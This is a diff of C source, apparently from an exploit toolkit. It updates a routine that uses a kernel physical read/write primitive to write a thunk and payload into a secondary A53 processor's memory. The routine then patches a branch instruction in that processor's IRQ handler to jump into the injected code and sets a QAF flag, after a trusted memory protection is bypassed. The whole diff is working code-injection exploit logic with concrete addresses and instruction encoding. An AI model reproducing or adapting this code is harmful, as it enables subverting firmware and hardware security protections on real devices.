@@ -110,8 +110,12 @@ static const unsigned int mp4_payload_bin_len = sizeof(mp4_payload_bin);
  * Steps:
  *   1. Write thunk code to 0x600E0000 (within branch range of hook site)
  *   2. Write main payload to 0x607F1000
- *   3. Patch BL mDbg_intr at 0x109854 to branch to thunk
- *   4. Enable QAF flag in mm4p_flags
+ *   3. Patch BL is_qaf at 0x108BD4 to branch to thunk
+ *   4. Enable QAF flag (dword_123B74)
+ *
+ * The hook at 0x108BD4 is in the IRQ handler (GIC IDs 83/78), called
+ * after all c2p registers have been read into W19-W24. The thunk
+ * shuffles these into the _start(core, cmd, arg1, arg2, arg3) ABI.
  *
  * Prerequisite: TMR 20 must be disabled (call tmr_bypass_init first).
  */
@@ -130,26 +134,25 @@ int mp4_inject_payload(struct phys_rw_ctx *ctx)
     kernel_copyin(mp4_payload_bin, dram_base_kva + MP4_PAYLOAD_OFFSET,
                   mp4_payload_bin_len);
 
-    /* Step 3: Patch BL mDbg_intr -> BL thunk
+    /* Step 3: Patch BL is_qaf -> BL thunk
      *
-     * Original: BL mDbg_intr at A53 VA 0x109854
-     * The ELF base in DRAM is at offset 0 (A53 VA 0x100000 maps to DRAM+0).
-     * Our thunk is at DRAM + 0xE0000, which is A53 VA 0x100000 + 0xE0000 = 0x1E0000.
+     * Hook site: BL is_qaf at A53 VA 0x108BD4 (IRQ handler)
+     * Thunk at DRAM + 0xE0000 = A53 VA 0x100000 + 0xE0000 = 0x1E0000
      *
      * BL encoding: 0x94000000 | (offset_in_words & 0x3FFFFFF)
      * offset = (thunk_addr - hook_addr) / 4
      */
     bl_offset = ((int32_t)(A53_ELF_BASE + MP4_THUNK_OFFSET) -
-                 (int32_t)A53_MDBG_INTR_ADDR) / 4;
+                 (int32_t)A53_HOOK_ADDR) / 4;
     branch_insn = 0x94000000 | (bl_offset & 0x03FFFFFF);
 
-    /* Write the patched instruction.
-     * In DRAM, offset from base = hook_addr - ELF_base = 0x109854 - 0x100000 = 0x9854 */
+    /* Write the patched BL instruction in DRAM.
+     * DRAM offset = hook_VA - ELF_base = 0x108BD4 - 0x100000 = 0x8BD4 */
     kernel_copyin(&branch_insn,
-                  dram_base_kva + (A53_MDBG_INTR_ADDR - A53_ELF_BASE),
+                  dram_base_kva + (A53_HOOK_ADDR - A53_ELF_BASE),
                   sizeof(branch_insn));
 
-    /* Step 4: Enable QAF in mm4p_flags */
+    /* Step 4: Enable QAF flag (dword_123B74 in .data.el3.loader) */
     qaf_flag = 1;
     kernel_copyin(&qaf_flag, dram_base_kva + A53_QAF_FLAGS_OFF,
                   sizeof(qaf_flag));
